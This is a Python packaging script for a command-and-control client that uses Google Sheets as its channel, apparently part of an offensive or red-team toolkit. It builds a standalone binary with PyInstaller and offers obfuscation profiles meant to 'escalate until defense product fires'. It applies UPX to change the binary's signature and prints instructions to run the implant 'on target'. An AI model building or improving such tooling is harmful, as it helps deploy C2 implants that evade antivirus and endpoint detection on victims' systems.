#!/usr/bin/env python3
"""
packager.py — build a standalone client binary using PyInstaller

Usage:
    python packager.py

Produces a single executable in dist/ for the current OS.
Environment variables must be set at runtime — they are NOT baked into the binary.

Obfuscation profiles (escalate until defense product fires):
    basic    — PyInstaller --onefile (default, implement first)
    upx      — PyInstaller + UPX compression         (planned)
    pyarmor  — PyArmor source encryption + PyInstaller (planned)
    nuitka   — Nuitka native compilation              (planned)
"""

import os
import shutil
import subprocess
import sys


# ---------------------------------------------------------------------------
# Prompt helpers
# ---------------------------------------------------------------------------

def _ask(prompt, choices, default=None):
    """Ask a multiple-choice question. Returns chosen key."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        marker = " (default)" if k == default else ""
        print(f"  [{i}] {label}{marker}")
    while True:
        raw = input("  Choice: ").strip()
        if raw == "" and default:
            return default
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return keys[int(raw) - 1]
        print("  Invalid — enter a number from the list.")


def _ask_multi(prompt, choices):
    """Ask a multiple-choice question allowing 'all'. Returns list of keys."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        print(f"  [{i}] {label}")
    print(f"  [a] All of the above")
    while True:
        raw = input("  Choice: ").strip().lower()
        if raw == "a":
            return keys
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return [keys[int(raw) - 1]]
        print("  Invalid — enter a number or 'a'.")


# ---------------------------------------------------------------------------
# Hidden import sets per module
# ---------------------------------------------------------------------------

CRYPTO_IMPORTS = {
    "plaintext": ["crypto.plaintext"],
    "fernet":    ["crypto.fernet"],
}

FRAGMENTER_IMPORTS = {
    "passthrough": ["fragmenter.passthrough"],
    "fixed":       ["fragmenter.fixed"],
}

# Always included — channel is always Sheets for now
ALWAYS_IMPORTS = [
    "channel.sheets",
    "channel.base",
    "crypto.base",
    "fragmenter.base",
]


# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def _pyinstaller_base_cmd(hidden_imports, output_name):
    """Build the common PyInstaller command shared by basic and upx profiles."""
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--clean",
        "--name", output_name,
        "--distpath", "dist",
        "--workpath", "build",
        "--specpath", "build",
    ]
    for imp in hidden_imports:
        cmd += ["--hidden-import", imp]
    cmd.append("client.py")
    return cmd


def build_basic(hidden_imports, output_name):
    """PyInstaller --onefile, no compression."""
    cmd = _pyinstaller_base_cmd(hidden_imports, output_name)
    print(f"\n[packager] Running: {' '.join(cmd)}\n")
    result = subprocess.run(cmd)
    return result.returncode == 0


def build_upx(hidden_imports, output_name):
    """PyInstaller --onefile, then UPX applied directly to the output binary.

    PyInstaller disables its built-in UPX integration on Linux due to known
    compatibility issues, so we run UPX on the finished binary instead.
    UPX adds a decompression stub — an analyst must 'upx -d' the binary before
    the Python layer is accessible. Typical size reduction: 40-50%.
    """
    upx_path = shutil.which("upx")
    if not upx_path:
        print("[packager] UPX not found on PATH — install with: sudo apt install upx")
        return False

    # Step 1 — build with PyInstaller (no --upx-dir, avoid the disabled integration)
    cmd = _pyinstaller_base_cmd(hidden_imports, output_name)
    print(f"\n[packager] Step 1 — PyInstaller build")
    print(f"[packager] Running: {' '.join(cmd)}\n")
    result = subprocess.run(cmd)
    if result.returncode != 0:
        return False

    # Step 2 — compress the output binary directly with UPX
    ext = ".exe" if sys.platform == "win32" else ""
    binary = os.path.join("dist", output_name + ext)
    print(f"\n[packager] Step 2 — UPX compression")
    print(f"[packager] Note: PyInstaller --onefile already compresses its payload,")
    print(f"[packager] so size reduction will be minimal (~0-2%). UPX still wraps")
    print(f"[packager] the binary with a different header/stub, changing its signature.")
    upx_cmd = [upx_path, "--best", binary]
    print(f"[packager] Running: {' '.join(upx_cmd)}\n")
    result = subprocess.run(upx_cmd)
    if result.returncode == 0:
        # UPX creates a .upx backup of the original — remove it
        backup = binary + ".upx"
        if os.path.exists(backup):
            os.remove(backup)
    return result.returncode == 0


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 52)
    print("  Sheets C2 — Client Packager")
    print("=" * 52)
    print(f"  Platform : {sys.platform}")
    print(f"  Python   : {sys.version.split()[0]}")
    print()
    print("  The binary reads config from environment variables at runtime.")
    print("  No credentials are baked in.")

    # ── Profile ──────────────────────────────────────────────────────────────
    profile = _ask(
        "Obfuscation profile:",
        {
            "basic":   "Basic — PyInstaller --onefile (default)",
            "upx":     "UPX   — PyInstaller + UPX compression (not yet implemented)",
            "pyarmor": "PyArmor — source encryption + PyInstaller (not yet implemented)",
            "nuitka":  "Nuitka — native compilation (not yet implemented)",
        },
        default="basic",
    )

    if profile in ("pyarmor", "nuitka"):
        print(f"\n[packager] Profile '{profile}' is not yet implemented.")
        print("  See ideas/client_packaging.md for the roadmap.")
        sys.exit(0)

    # ── Crypto modules ────────────────────────────────────────────────────────
    crypto_choices = _ask_multi(
        "Which encryption module(s) to include?",
        {
            "plaintext": "Plaintext — no encryption (debug/demo)",
            "fernet":    "Fernet    — AES + HMAC (recommended for ops)",
        },
    )

    # ── Fragmenter modules ────────────────────────────────────────────────────
    frag_choices = _ask_multi(
        "Which fragmentation module(s) to include?",
        {
            "passthrough": "Passthrough — no fragmentation (default)",
            "fixed":       "Fixed       — fixed-size chunks",
        },
    )

    # ── Output name ───────────────────────────────────────────────────────────
    default_name = "client"
    raw = input(f"\n  Output binary name (default: {default_name}): ").strip()
    output_name = raw if raw else default_name

    # ── Collect hidden imports ────────────────────────────────────────────────
    hidden = list(ALWAYS_IMPORTS)
    for c in crypto_choices:
        hidden += CRYPTO_IMPORTS[c]
    for f in frag_choices:
        hidden += FRAGMENTER_IMPORTS[f]

    print(f"\n[packager] Hidden imports: {hidden}")

    # ── Build ─────────────────────────────────────────────────────────────────
    if profile == "upx":
        ok = build_upx(hidden, output_name)
    else:
        ok = build_basic(hidden, output_name)

    if ok:
        ext = ".exe" if sys.platform == "win32" else ""
        binary = os.path.join("dist", output_name + ext)
        size_mb = os.path.getsize(binary) / 1024 / 1024
        print(f"\n[packager] Binary: {binary}  ({size_mb:.1f} MB)")
        print(f"[packager] Run on target:")
        print(f"  PYTHONUNBUFFERED=1 SPREADSHEET_ID=xxx FORMS_URL=xxx ./{output_name}{ext}")
        print(f"  (PYTHONUNBUFFERED=1 ensures logs appear immediately)")
    else:
        print("\n[packager] Build failed — check PyInstaller output above.")
        sys.exit(1)


if __name__ == "__main__":
    main()
